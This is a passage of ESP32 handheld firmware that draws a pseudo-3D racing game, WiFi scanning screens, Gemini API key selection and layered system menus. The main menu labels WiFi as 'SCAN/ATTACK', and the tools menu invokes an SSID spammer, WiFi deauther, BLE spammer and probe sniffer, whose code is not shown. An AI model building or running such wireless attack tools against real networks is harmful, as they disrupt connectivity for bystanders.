  // Actually for lines, we just draw them. Hills require scaling Y based on Z *and* Height.

  for(int i=RACING_ROAD_SEGMENTS - 1; i >= 0; i--) { // Draw Back to Front?
    // Wait, simple lines is easier Front to Back for optimization, but Back to Front for painters.
    // Let's stick to simple line drawing loop, but calculate Y with height.
  }

  // We need to loop i=0 (near) to Max (far) to calculate Z properly, but drawing order depends on sprites.
  // Let's stick to the current loop direction (0 to Max) which is Near to Far.
  // Wait, perspective is usually drawn Back to Front (Far to Near) to handle overlap correctly?
  // But for wireframe road lines, it doesn't matter much unless solid.
  // Let's keep 0 to Max (Near to Far) for Z calculation simplicity.

  for(int i=0; i<RACING_ROAD_SEGMENTS; i++) {
    // Calculate Z depth (screen space)
    float z = i;
    float scale = 150.0f / (z + 1.0f); // Projection scale factor

    // Calculate Segment Height relative to Camera
    int segIndex = ((int)(racing.trackPosition + i)) % 100;
    float worldHeight = racing.roadHeight[segIndex];
    float heightDiff = worldHeight - racing.camHeight;

    // Project Y
    // screenY = Horizon + (HeightDiff * Scale) + (BasePitch * i)
    // We add a base pitch effect to make the road recede down/up naturally
    int projectedY = (SCREEN_HEIGHT / 2) - (heightDiff * scale * 0.01f) + (i * 2); // i*2 mimics the flat plane recession

    // Clamp to horizon
    if (projectedY < horizonY) projectedY = horizonY;
    if (projectedY > SCREEN_HEIGHT) continue;

    // Project X and Width
    int w = roadWidth * scale * 0.02f;
    int curveShift = racing.roadCurvature * i * i * 0.5f;

    // Alternating colors
    int stripe = ((int)(racing.trackPosition + i) % 2 == 0) ? 1 : 0;

    if (stripe) {
      display.drawLine(centerX - w + curveShift, projectedY, centerX + w + curveShift, projectedY, SSD1306_WHITE);
    } else {
      // Draw road edges
      display.drawPixel(centerX - w + curveShift, projectedY, SSD1306_WHITE);
      display.drawPixel(centerX + w + curveShift, projectedY, SSD1306_WHITE);
    }
  }

  // Re-loop for Sprites (Back to Front would be better, but we only have a few objects)
  // Let's stick to the simple object loop, but apply the new Y projection.

  // Helper lambda or macro would be nice, but we are in C++.
  // Let's just copy the Y-projection math.
  #define PROJECT_Y(idx) ((SCREEN_HEIGHT / 2) - ((racing.roadHeight[((int)(racing.trackPosition + idx)) % 100] - racing.camHeight) * (150.0f / (idx + 1.0f)) * 0.01f) + (idx * 2))

  // Draw Scenery
  for(int i=0; i<10; i++) {
     if (racing.scenery[i].active) {
         float z = racing.scenery[i].z;
         if (z > 0 && z < RACING_ROAD_SEGMENTS) {
             int y = PROJECT_Y(z);
             if (y < horizonY) continue;

             int curveShift = racing.roadCurvature * z * z * 0.5f;
             float scale = 150.0f / (z + 1.0f);
             int w = 200 * scale * 0.02f;

             int ex = centerX + curveShift + (racing.scenery[i].side * (w + 20));
             int size = 16 * (1.0f - z/RACING_ROAD_SEGMENTS);

             if (size > 2) {
                if (racing.scenery[i].type == 0) { // Tree
                    display.drawTriangle(ex, y-size, ex-size/2, y, ex+size/2, y, SSD1306_WHITE);
                    display.drawLine(ex, y, ex, y+size/4, SSD1306_WHITE);
                } else { // Light
                     display.drawLine(ex, y, ex, y-size, SSD1306_WHITE);
                     display.drawPixel(ex + (racing.scenery[i].side > 0 ? -2 : 2), y-size, SSD1306_WHITE);
                }
             }
         }
     }
  }

  // Draw Enemies
  for(int i=0; i<5; i++) {
     if (racing.enemies[i].active) {
         float z = racing.enemies[i].z;
         if (z > 0 && z < RACING_ROAD_SEGMENTS) {
             int y = PROJECT_Y(z);
             if (y < horizonY) continue;

             int curveShift = racing.roadCurvature * z * z * 0.5f;
             float scale = 150.0f / (z + 1.0f);
             int w = 200 * scale * 0.02f;

             // Project X
             int ex = (centerX) + (racing.enemies[i].x * w) + curveShift;

             int size = 16 * (1.0f - z/RACING_ROAD_SEGMENTS);
             if (size > 4) {
                // Use Enemy Bitmap if large enough
                if (size >= 12) {
                   display.drawBitmap(ex - 8, y - 12, BITMAP_ENEMY, 16, 16, SSD1306_WHITE, SSD1306_BLACK);
                } else {
                   display.fillRect(ex - size/2, y - size, size, size/2, SSD1306_WHITE);
                }
             }
         }
     }
  }

  // Speed Lines (Turbo Effect)
  if (racing.speed > 150) {
     int cx = SCREEN_WIDTH / 2;
     int cy = horizonY;
     for(int i=0; i<4; i++) {
         int angle = random(0, 360);
         float rad = angle * PI / 180.0;
         int x1 = cx + cos(rad) * 10;
         int y1 = cy + sin(rad) * 10;
         int x2 = cx + cos(rad) * 60;
         int y2 = cy + sin(rad) * 60;
         display.drawLine(x1, y1, x2, y2, SSD1306_WHITE);
     }
  }

  // Draw Player Car (Using Bitmaps)
  int carScreenX = SCREEN_WIDTH/2 + (racing.carX * 30); // Multiplier for lane width
  int shakeX = (screenShake > 0) ? random(-2, 3) : 0;
  int carY = SCREEN_HEIGHT - 22; // Position from bottom

  // Select sprite based on steering
  const unsigned char* carSprite = BITMAP_CAR_STRAIGHT;
  if (digitalRead(BTN_LEFT) == LOW) carSprite = BITMAP_CAR_LEFT;
  if (digitalRead(BTN_RIGHT) == LOW) carSprite = BITMAP_CAR_RIGHT;

  // Draw car with background clearing (BLACK) then sprite (WHITE)
  // drawBitmap(x, y, bitmap, w, h, color, bg)
  display.drawBitmap(carScreenX - 8 + shakeX, carY, carSprite, 16, 16, SSD1306_WHITE, SSD1306_BLACK);

  drawParticles();

  // Dashboard
  display.fillRect(0, SCREEN_HEIGHT - 12, SCREEN_WIDTH, 12, SSD1306_BLACK);
  display.drawLine(0, SCREEN_HEIGHT - 12, SCREEN_WIDTH, SCREEN_HEIGHT - 12, SSD1306_WHITE);

  // Gear
  display.setTextSize(1);
  display.setCursor(2, SCREEN_HEIGHT - 10);
  if (racing.clutchPressed) display.print("N");
  else display.print(racing.gear);

  // Speed
  display.setCursor(20, SCREEN_HEIGHT - 10);
  display.print((int)racing.speed);
  display.setTextSize(1);
  display.setCursor(45, SCREEN_HEIGHT - 10);
  display.print("km/h");

  // RPM Gauge
  int rpmWidth = map(racing.rpm, 0, 9000, 0, 50);
  display.drawRect(70, SCREEN_HEIGHT - 10, 52, 8, SSD1306_WHITE);
  display.fillRect(72, SCREEN_HEIGHT - 8, rpmWidth, 4, SSD1306_WHITE);

  // Redline
  if (racing.rpm > 8000) {
      display.fillRect(122, SCREEN_HEIGHT - 10, 4, 8, SSD1306_WHITE); // Shift light
  }

  // Draw Lives or Mode
  if (racing.mode == RACING_MODE_CHALLENGE) {
      for(int i=0; i<racing.lives; i++) {
         drawIcon(2 + (i*10), 12, ICON_HEART);
      }
  } else {
      display.setCursor(2, 12);
      display.print("FREE DRIVE");
  }

  // Game Over
  if (racing.gameOver) {
    display.fillRect(10, 20, 108, 30, SSD1306_BLACK);
    display.drawRect(10, 20, 108, 30, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(30, 25);
    display.print("GAME OVER");
    display.setCursor(25, 38);
    display.print("Score: ");
    display.print(racing.score);
    if (racing.score >= highScoreRacing && racing.score > 0) {
        display.setCursor(85, 38);
        display.print("NEW!");
    }
  } else {
      // Draw High Score during gameplay
      display.setCursor(100, 2);
      display.print(highScoreRacing);
  }

  display.display();
}

void handleRacingInput() {
   if (digitalRead(BTN_SELECT) == LOW) {
       racing.clutchPressed = true;
   } else {
       racing.clutchPressed = false;
   }

   // Shifting Logic (Simple sequential)
   // In a real car, you use stick. Here we might just use Select to clutch,
   // but how to shift? Let's say: Clutch + Up = Shift Up, Clutch + Down = Shift Down?
   // Or maybe automatic shifting is easier?
   // Let's implement semi-auto: if RPM high > 7000, shift up? No, user wants manual.

   // Let's use Touch buttons for shifting?
   // Or Clutch + Up/Down.
   static bool upPressed = false;
   static bool downPressed = false;

   if (racing.clutchPressed) {
       if (digitalRead(BTN_UP) == LOW && !upPressed) {
           if (racing.gear < 5) racing.gear++;
           upPressed = true;
       }
       if (digitalRead(BTN_UP) == HIGH) upPressed = false;

       if (digitalRead(BTN_DOWN) == LOW && !downPressed) {
           if (racing.gear > 1) racing.gear--;
           downPressed = true;
       }
       if (digitalRead(BTN_DOWN) == HIGH) downPressed = false;
   }
}

// ========== GAME SELECT ==========

void showGameSelect(int x_offset) {
  const char* games[] = {
    "Turbo Racing",
    "Neon Invaders",
    "Astro Rush",
    "Vector Pong",
    "Back"
  };
  static float gameScrollY = 0;
  drawGenericListMenu(x_offset, "SELECT GAME", ICON_GAME, games, 5, menuSelection, &gameScrollY);
}

void handleGameSelectSelect() {
  switch(menuSelection) {
    case 0: // Turbo Racing
      menuSelection = 0; // Reset for submenu
      changeState(STATE_RACING_MODE_SELECT);
      break;
    case 1:
      initSpaceInvaders();
      changeState(STATE_GAME_SPACE_INVADERS);
      break;
    case 2:
      initSideScroller();
      changeState(STATE_GAME_SIDE_SCROLLER);
      break;
    case 3:
      initPong();
      changeState(STATE_GAME_PONG);
      break;
    case 4:
      changeState(STATE_MAIN_MENU);
      break;
  }
}

// ========== RACING MODE SELECT ==========

void showRacingModeSelect(int x_offset) {
  const char* modes[] = {
    "Free Drive",
    "Challenge Mode"
  };
  static float racingScrollY = 0;
  drawGenericListMenu(x_offset, "RACING MODE", ICON_GAME, modes, 2, menuSelection, &racingScrollY);
}

void handleRacingModeSelect() {
  if (menuSelection == 0) {
      initRacing(RACING_MODE_FREE);
  } else {
      initRacing(RACING_MODE_CHALLENGE);
  }
  changeState(STATE_GAME_RACING);
}

// ========== WIFI FUNCTIONS ==========

void showWiFiMenu(int x_offset) {
  display.clearDisplay();
  drawStatusBar();
  
  display.setTextSize(1);
  display.setCursor(x_offset + 25, 3);
  display.print("WiFi MANAGER");
  
  drawIcon(x_offset + 10, 2, ICON_WIFI);
  
  display.drawLine(x_offset + 0, 13, x_offset + SCREEN_WIDTH, 13, SSD1306_WHITE);

  // Status Box
  display.drawRoundRect(x_offset + 2, 16, SCREEN_WIDTH - 4, 18, 3, SSD1306_WHITE);
  display.setCursor(x_offset + 6, 21);
  
  if (WiFi.status() == WL_CONNECTED) {
    String ssid = WiFi.SSID();
    if (ssid.length() > 16) ssid = ssid.substring(0, 16) + "..";
    display.print(ssid);
    // RSSI Bar in box
    int rssi = WiFi.RSSI();
    int bars = map(rssi, -100, -50, 1, 4);
    bars = constrain(bars, 1, 4);
    for(int b=0; b<bars; b++) display.fillRect(x_offset + 115 + (b*3), 28 - (b*2), 2, (b*2)+2, SSD1306_WHITE);
  } else {
    display.print("Not Connected");
  }
  
  const char* menuItems[] = {"Scan Networks", "Forget Network", "Back"};
  
  int startY = 38;
  int itemHeight = 12; // Same as generic

  for (int i = 0; i < 3; i++) {
    int y = startY + (i * itemHeight);
    if (i == menuSelection) {
      display.fillRoundRect(x_offset + 2, y, SCREEN_WIDTH - 6, itemHeight - 1, 3, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(x_offset + 6, y + 2);
      display.print("> ");
    } else {
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(x_offset + 6, y + 2);
      display.print("  ");
    }
    display.print(menuItems[i]);
  }
  
  display.display();
}

void handleWiFiMenuSelect() {
  switch(menuSelection) {
    case 0:
      scanWiFiNetworks();
      break;
    case 1:
      forgetNetwork();
      break;
    case 2:
      changeState(STATE_MAIN_MENU);
      break;
  }
}

void scanWiFiNetworks() {
  showProgressBar("Scanning", 0);
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  showProgressBar("Scanning", 30);
  
  int n = WiFi.scanNetworks();
  networkCount = min(n, 20);
  
  showProgressBar("Processing", 60);
  
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
  }
  
  showProgressBar("Sorting", 80);
  
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = i + 1; j < networkCount; j++) {
      if (networks[j].rssi > networks[i].rssi) {
        WiFiNetwork temp = networks[i];
        networks[i] = networks[j];
        networks[j] = temp;
      }
    }
  }
  
  showProgressBar("Complete", 100);
  delay(500);
  
  selectedNetwork = 0;
  wifiPage = 0;
  changeState(STATE_WIFI_SCAN);
}

void displayWiFiNetworks(int x_offset) {
  display.clearDisplay();
  drawStatusBar();
  
  display.setTextSize(1);
  display.setCursor(x_offset + 5, 0);
  display.print("WiFi (");
  display.print(networkCount);
  display.print(")");
  
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  if (networkCount == 0) {
    display.setCursor(10, 25);
    display.println("No networks found");
  } else {
    int startIdx = wifiPage * wifiPerPage;
    int endIdx = min(networkCount, startIdx + wifiPerPage);
    
    for (int i = startIdx; i < endIdx; i++) {
      int y = 12 + (i - startIdx) * 12;
      
      if (i == selectedNetwork) {
        display.fillRect(0, y, SCREEN_WIDTH, 11, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      
      display.setCursor(2, y + 2);
      
      String displaySSID = networks[i].ssid;
      if (displaySSID.length() > 14) {
        displaySSID = displaySSID.substring(0, 14) + "..";
      }
      display.print(displaySSID);
      
      if (networks[i].encrypted) {
        display.setCursor(100, y + 2);
        display.print("L");
      }
      
      int bars = map(networks[i].rssi, -100, -50, 1, 4);
      bars = constrain(bars, 1, 4);
      display.setCursor(110, y + 2);
      for (int b = 0; b < bars; b++) {
        display.print("|");
      }
      
      display.setTextColor(SSD1306_WHITE);
    }
    
    if (networkCount > wifiPerPage) {
      display.setCursor(45, 56);
      display.print("Pg ");
      display.print(wifiPage + 1);
      display.print("/");
      display.print((networkCount + wifiPerPage - 1) / wifiPerPage);
    }
  }
  
  display.display();
}

// ========== API SELECT ==========

void showAPISelect(int x_offset) {
  display.clearDisplay();
  drawStatusBar();
  
  display.setTextSize(1);
  display.setCursor(x_offset + 25, 3);
  display.print("API SELECTION");
  drawIcon(x_offset + 10, 2, ICON_SYS_SETTINGS);
  display.drawLine(x_offset, 13, x_offset + SCREEN_WIDTH, 13, SSD1306_WHITE);
  
  const char* items[] = {"Gemini API Key #1", "Gemini API Key #2"};
  
  int itemHeight = 16; // Taller
  int startY = 20;
  
  for (int i = 0; i < 2; i++) {
    int y = startY + (i * itemHeight);

    if (i == menuSelection) {
      display.fillRoundRect(x_offset + 5, y, SCREEN_WIDTH - 10, 14, 3, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.drawRoundRect(x_offset + 5, y, SCREEN_WIDTH - 10, 14, 3, SSD1306_WHITE);
      display.setTextColor(SSD1306_WHITE);
    }

    display.setCursor(x_offset + 10, y + 3);
    display.print(items[i]);

    // Checkmark
    if (selectedAPIKey == (i + 1)) {
        display.setCursor(x_offset + 110, y + 3);
        display.print("*");
    }
  }
  
  display.display();
}

void handleAPISelectSelect() {
  if (menuSelection == 0) {
    selectedAPIKey = 1;
  } else {
    selectedAPIKey = 2;
  }
  savePreferenceInt("api_key", selectedAPIKey);
  
  ledSuccess();
  
  userInput = "";
  keyboardContext = CONTEXT_CHAT;
  cursorX = 0;
  cursorY = 0;
  currentKeyboardMode = MODE_LOWER;
  changeState(STATE_KEYBOARD);
}

// ========== MAIN MENU ==========

// ================================================================
// UI OVERHAUL: NET-RUNNER SPLIT MENU
// ================================================================

void showMainMenu(int x_offset) {
  display.clearDisplay();

  // --- DATA MENU ---
  // Kita definisikan ulang di sini biar rapi
  struct MenuItem {
    const char* title;
    const char* subtitle;
    const unsigned char* icon;
  };

  MenuItem items[] = {
    {"AI CHAT",   "GEMINI INTEL",  ICON_CHAT},
    {"WIFI MGR",  "SCAN/ATTACK",   ICON_WIFI},
    {"GAMES",     "ARCADE ZONE",   ICON_GAME},
    {"VIDEO",     "BAD APPLE",     ICON_VIDEO},
    {"COURIER",   "LIVE TRACK",    ICON_TRUCK},
    {"SYSTEM",    "DEVICE INFO",   ICON_SYSTEM}
  };
  int numItems = 6;

  // --- BAGIAN 1: SIDEBAR (KIRI) ---
  int sidebarWidth = 26;
  
  // Garis pemisah sidebar
  display.drawLine(sidebarWidth + x_offset, 0, sidebarWidth + x_offset, SCREEN_HEIGHT, SSD1306_WHITE);

  // Scroll Sidebar Logic
  int sidebarScrollY = 0;
  if (menuSelection > 3) {
      sidebarScrollY = (menuSelection - 3) * 12;
  }
  
  // Render Ikon Sidebar
  for (int i = 0; i < numItems; i++) {
    int y = 4 + (i * 12) - sidebarScrollY; // Jarak antar ikon
    
    // Only draw if visible
    if (y > -8 && y < SCREEN_HEIGHT) {
        if (i == menuSelection) {
          // Kotak Seleksi (Inverted) di Sidebar
          display.fillRect(0 + x_offset, y - 2, sidebarWidth, 11, SSD1306_WHITE);
          // Gambar Ikon Hitam (Inverted)
          display.drawBitmap(9 + x_offset, y, items[i].icon, 8, 8, SSD1306_BLACK);
          // Indikator panah kecil
          display.drawPixel(2 + x_offset, y + 3, SSD1306_BLACK);
          display.drawPixel(3 + x_offset, y + 4, SSD1306_BLACK);
          display.drawPixel(2 + x_offset, y + 5, SSD1306_BLACK);
        } else {
          // Ikon Putih Normal
          display.drawBitmap(9 + x_offset, y, items[i].icon, 8, 8, SSD1306_WHITE);
        }
    }
  }

  // --- BAGIAN 2: CONTENT AREA (KANAN) ---
  int contentX = sidebarWidth + 4 + x_offset;

  // Header Box
  display.fillRect(contentX, 0, 100, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(contentX + 2, 1);
  display.print("MODE: ");
  display.print(items[menuSelection].title); // Judul Menu Terpilih

  display.setTextColor(SSD1306_WHITE);

  // Subtitle / Deskripsi
  display.setCursor(contentX, 15);
  display.print(">> ");
  display.print(items[menuSelection].subtitle);

  // --- BAGIAN 3: WIDGET VISUAL (BIAR CANGGIH) ---
  // Kita gambar grafik/kotak info beda-beda tergantung menu yang dipilih

  int widgetY = 30;
  display.drawRect(contentX, widgetY, 94, 32, SSD1306_WHITE); // Frame Widget

  if (menuSelection == 0) {
    // Tampilan CHAT AI: Gelombang Suara Palsu
    display.setCursor(contentX + 2, widgetY + 2); display.print("VOICE_LINK:");
    for (int i = 0; i < 80; i+=3) {
      int h = random(2, 15);
      display.drawLine(contentX + 2 + i, widgetY + 25, contentX + 2 + i, widgetY + 25 - h, SSD1306_WHITE);
    }
  }
  else if (menuSelection == 1) {
    // Tampilan WIFI: Grafik Sinyal & Data Packet
    display.setCursor(contentX + 2, widgetY + 2); display.print("AIR_TRAFFIC:");
    // Grafik garis acak
    int prevY = 0;
    for (int i = 0; i < 80; i+=5) {
      int newY = random(0, 15);
      display.drawLine(contentX + i, widgetY + 28 - prevY, contentX + i + 5, widgetY + 28 - newY, SSD1306_WHITE);
      prevY = newY;
    }
  }
  else if (menuSelection == 4) {
    // Tampilan COURIER: Peta Mini
    display.setCursor(contentX + 2, widgetY + 2); display.print("TRACKING:");
    // Draw simple map path
    display.drawLine(contentX + 10, widgetY + 25, contentX + 30, widgetY + 15, SSD1306_WHITE);
    display.drawLine(contentX + 30, widgetY + 15, contentX + 60, widgetY + 20, SSD1306_WHITE);
    display.fillCircle(contentX + 10, widgetY + 25, 2, SSD1306_WHITE); // Start
    display.fillCircle(contentX + 60, widgetY + 20, 2, SSD1306_WHITE); // End
    // Blink curr pos
    if((millis()/500)%2) display.drawCircle(contentX + 30, widgetY + 15, 3, SSD1306_WHITE);
  }
  else if (menuSelection == 5) {
    // Tampilan SYSTEM: Memory Block
    display.setCursor(contentX + 2, widgetY + 2); display.print("MEM_DUMP:");
    for(int y=0; y<3; y++) {
      for(int x=0; x<10; x++) {
         if(random(0,2)) display.fillRect(contentX + 2 + (x*8), widgetY + 12 + (y*6), 6, 4, SSD1306_WHITE);
         else display.drawRect(contentX + 2 + (x*8), widgetY + 12 + (y*6), 6, 4, SSD1306_WHITE);
      }
    }
  }
  else {
    // Default: Binary Rain statis
    display.setCursor(contentX + 2, widgetY + 2); display.print("DATA_STREAM:");
    for(int i=0; i<30; i++) {
        display.setCursor(contentX + 2 + (i*10) % 80, widgetY + 12 + (i/8)*8);
        display.print(random(0,2));
    }
  }

  // Footer Info (Status Bar Mini di Bawah)
  display.drawLine(contentX, 54, 128, 54, SSD1306_WHITE);
  display.setCursor(contentX, 56);

  // Jam / Uptime
  if (cachedTimeStr.length() > 0) display.print(cachedTimeStr);
  else { display.print("T:"); display.print(millis()/1000); }

  // Battery / Power (Fake Indicator)
  display.setCursor(100, 56);
  display.print("PWR:OK");

  display.display();
}

void handleMainMenuSelect() {
  mainMenuSelection = menuSelection;
  switch(mainMenuSelection) {
    case 0: // Chat AI
      if (WiFi.status() == WL_CONNECTED) {
        changeState(STATE_API_SELECT);
      } else {
        ledError();
        showStatus("WiFi not connected!\nGo to WiFi Settings", 2000);
      }
      break;
    case 1: // WiFi
      changeState(STATE_WIFI_MENU);
      break;
    case 2: // Games
      changeState(STATE_GAME_SELECT);
      break;
    case 3: // Video Player
      videoCurrentFrame = 0;
      changeState(STATE_VIDEO_PLAYER);
      break;
    case 4: // Courier
      changeState(STATE_TOOL_COURIER);
      break;
    case 5: // System Info
      systemMenuSelection = 0;
      changeState(STATE_SYSTEM_MENU);
      break;
  }
}

void drawVideoPlayer() {
  // Simple frame timing
  if (millis() - lastVideoFrameTime > videoFrameDelay) {
    lastVideoFrameTime = millis();

    display.clearDisplay();

    if (videoTotalFrames > 0 && videoFrames[0] != NULL) {
      display.drawBitmap(0, 0, videoFrames[videoCurrentFrame], SCREEN_WIDTH, SCREEN_HEIGHT, SSD1306_WHITE);

      videoCurrentFrame++;
      if (videoCurrentFrame >= videoTotalFrames) {
        videoCurrentFrame = 0;
      }
    } else {
      display.setCursor(10, 20);
      display.setTextSize(1);
      display.println("No Video Data");
      display.setCursor(10, 35);
      display.println("Add frames to code");
    }

    display.display();
  }
}

void setScreenBrightness(int val) {
  screenBrightness = constrain(val, 0, 255);
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(screenBrightness);
}

void drawGenericListMenu(int x_offset, const char* title, const unsigned char* icon, const char** items, int itemCount, int selection, float* scrollY) {
  display.clearDisplay();
  drawStatusBar();

  // Header
  display.setTextSize(1);
  display.setCursor(x_offset + 25, 3);
  display.print(title);
  if(icon) drawIcon(x_offset + 10, 2, icon);
  display.drawLine(x_offset, 13, x_offset + SCREEN_WIDTH, 13, SSD1306_WHITE);

  int itemHeight = 12; // Taller for better look
  int startY = 16;
  int maxVisible = 4;

  // Smooth scroll logic
  float targetScroll = 0;
  if (selection >= maxVisible) {
      targetScroll = (selection - maxVisible + 1) * itemHeight;
  } else {
      targetScroll = 0;
  }

  // Simple easing
  if (abs(*scrollY - targetScroll) > 0.5f) {
      *scrollY += (targetScroll - *scrollY) * 0.3f;
  } else {
      *scrollY = targetScroll;
  }

  for (int i = 0; i < itemCount; i++) {
    float y = startY + (i * itemHeight) - *scrollY;

    // Only draw visible items
    if (y > 13 && y < SCREEN_HEIGHT) {
        if (i == selection) {
          // Modern Inverted Rounded Rect Selection
          display.fillRoundRect(x_offset + 2, y, SCREEN_WIDTH - 6, itemHeight - 1, 3, SSD1306_WHITE);
          display.setTextColor(SSD1306_BLACK);
          display.setCursor(x_offset + 6, y + 2);
          display.print("> ");
        } else {
          display.setTextColor(SSD1306_WHITE);
          display.setCursor(x_offset + 6, y + 2);
          display.print("  ");
        }

        display.print(items[i]);

        // Add dynamic value indicators for specific menus (Hack: check title)
        // Ideally this would be a callback or struct, but for now this works.
        if (strcmp(title, "SETTINGS") == 0) {
           if (i == 1) { // Brightness
              if (screenBrightness < 50) display.print(" [Low]");
              else if (screenBrightness < 150) display.print(" [Med]");
              else display.print(" [High]");
           }
           if (i == 2) display.print(showFPS ? " [ON]" : " [OFF]");
           if (i == 3) display.print(pinLockEnabled ? " [ON]" : " [OFF]");
           if (i == 5) display.print(screensaverMode == 0 ? " [Bac]" : " [Mtx]");
        }
    }
  }

  // Scrollbar indicator
  if (itemCount > maxVisible) {
      int barHeight = (SCREEN_HEIGHT - 13) * maxVisible / itemCount;
      int scrollRange = (itemCount - maxVisible) * itemHeight;
      int barRange = (SCREEN_HEIGHT - 13 - barHeight);

      int barY = 13 + (*scrollY / scrollRange) * barRange;

      // Clamp
      if (barY < 13) barY = 13;
      if (barY + barHeight > SCREEN_HEIGHT) barY = SCREEN_HEIGHT - barHeight;

      display.fillRect(SCREEN_WIDTH - 3, barY, 2, barHeight, SSD1306_WHITE);
  }

  display.display();
}

void showSystemMenu(int x_offset) {
  const char* items[] = {
    "Device Status",
    "Settings & UI",
    "Tools & Utils",
    "Back"
  };
  drawGenericListMenu(x_offset, "SYSTEM MENU", ICON_SYSTEM, items, 4, systemMenuSelection, &systemMenuScrollY);
}

void showSystemStatusMenu(int x_offset) {
  const char* items[] = {
    "Performance",
    "Network Info",
    "Device & Storage",
    "Back"
  };
  drawGenericListMenu(x_offset, "STATUS INFO", ICON_SYS_STATUS, items, 4, systemMenuSelection, &systemMenuScrollY);
}

void showSystemSettingsMenu(int x_offset) {
  const char* items[] = {
    "Power Mode",
    "Brightness",
    "Show FPS",
    "PIN Lock",
    "Change PIN",
    "Saver",
    "Back"
  };
  drawGenericListMenu(x_offset, "SETTINGS", ICON_SYS_SETTINGS, items, 7, systemMenuSelection, &systemMenuScrollY);
}

void showSystemToolsMenu(int x_offset) {
  const char* items[] = {
    "Clear AI Data",
    "I2C Benchmark",
    "SSID Spammer",
    "Deauth Detect",
    "Probe Sniffer",
    "WiFi Deauther",
    "BLE Spammer",
    "Courier Check",
    "Recovery Mode",
    "Reboot System",
    "Back"
  };
  drawGenericListMenu(x_offset, "TOOLS", ICON_SYS_TOOLS, items, 11, systemMenuSelection, &systemMenuScrollY);
}

void handleSystemMenuSelect() {
  switch(systemMenuSelection) {
    case 0: systemMenuSelection = 0; changeState(STATE_SYSTEM_SUB_STATUS); break;
    case 1: systemMenuSelection = 0; changeState(STATE_SYSTEM_SUB_SETTINGS); break;
    case 2: systemMenuSelection = 0; changeState(STATE_SYSTEM_SUB_TOOLS); break;
    case 3: changeState(STATE_MAIN_MENU); break;
  }
}

void handleSystemStatusMenuSelect() {
  switch(systemMenuSelection) {
    case 0: changeState(STATE_SYSTEM_PERF); break;
    case 1: changeState(STATE_SYSTEM_NET); break;
    case 2: changeState(STATE_SYSTEM_DEVICE); break;
    case 3: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 0; break;
  }
}

void handleSystemSettingsMenuSelect() {
  switch(systemMenuSelection) {
    case 0: changeState(STATE_SYSTEM_POWER); break;
    case 1:
      // Toggle Brightness
      if (screenBrightness >= 200) setScreenBrightness(10);
      else if (screenBrightness >= 100) setScreenBrightness(255);
      else setScreenBrightness(128);
      break;
    case 2:
      showFPS = !showFPS;
      savePreferenceBool("showFPS", showFPS);
      break;
    case 3:
      pinLockEnabled = !pinLockEnabled;
      savePreferenceBool("pin_lock", pinLockEnabled);
      if(pinLockEnabled && pinCode == "") {
           pinCode = "1234";
           savePreferenceString("pin_code", pinCode);
      }
      break;
    case 4:
      inputPin = "";
      currentKeyboardMode = MODE_NUMBERS;
      changeState(STATE_CHANGE_PIN);
      break;
    case 5:
      screensaverMode = !screensaverMode;
      savePreferenceInt("saver_mode", screensaverMode);
      break;
    case 6: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 1; break;
  }
}

void handleSystemToolsMenuSelect() {
  switch(systemMenuSelection) {
    case 0: clearChatHistory(); break;
    case 1: changeState(STATE_SYSTEM_BENCHMARK); break;
    case 2:
      initSpammer();
      changeState(STATE_TOOL_SPAMMER);
      break;
    case 3:
      initDetector();
      changeState(STATE_TOOL_DETECTOR);
      break;
    case 4:
      initProbeSniffer();
      changeState(STATE_TOOL_PROBE_SNIFFER);
      break;
    case 5:
      scanForDeauth();
      break;
    case 6:
      menuSelection = 0;
      changeState(STATE_TOOL_BLE_MENU);
      break;
    case 7:
      changeState(STATE_TOOL_COURIER);
      break;
    case 8:
      runRecoveryMode();
      break;
    case 9:
      display.clearDisplay();
      display.setCursor(30, 30);
      display.print("Rebooting...");
      display.display();
      delay(500);
      ESP.restart();
      break;
    case 10: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 2; break;
  }
}

void showSystemPerf(int x_offset) {
  display.clearDisplay();
  drawStatusBar();

  display.setTextSize(1);
  display.setCursor(x_offset + 2, 16);
  display.print("CPU: ");
  display.print(temperatureRead(), 1);
  display.print("C");

  display.setCursor(x_offset + 64, 16);
  display.print("FPS: ");
  display.print(perfFPS);

  display.setCursor(x_offset + 2, 26);
  display.print("LPS: ");
  display.print(perfLPS);

  display.setCursor(x_offset + 2, 36);
  display.print("RAM: ");
  display.print(ESP.getFreeHeap() / 1024);
  display.print("KB");

  display.setCursor(x_offset + 64, 36);
  display.print("/");
  display.print(ESP.getHeapSize() / 1024);
  display.print("KB");

  display.setCursor(x_offset + 2, 46);
  display.print("PSR: ");
  if (psramFound()) {
      display.print(ESP.getFreePsram() / 1024 / 1024);
      display.print("MB");

      display.setCursor(x_offset + 64, 46);
      display.print("/");
      display.print(ESP.getPsramSize() / 1024 / 1024);
      display.print("MB");
  } else {
      display.print("N/A");
  }

  display.setCursor(x_offset + 2, 56);
  display.print("Up: ");
  unsigned long s = millis() / 1000;
  int h = s / 3600;
  int m = (s % 3600) / 60;
  int sec = s % 60;

  if(h<10) display.print("0");
  display.print(h);
  display.print(":");
  if(m<10) display.print("0");
  display.print(m);
  display.print(":");
  if(sec<10) display.print("0");
  display.print(sec);

  display.display();
}

void showSystemPower(int x_offset) {
  display.clearDisplay();
  drawStatusBar();

  display.setTextSize(1);
  display.setCursor(x_offset + 30, 5);
  display.print("POWER MODE");
  display.drawLine(x_offset, 15, x_offset + SCREEN_WIDTH, 15, SSD1306_WHITE);

  const char* modes[] = {
    "Saver (160 MHz)",
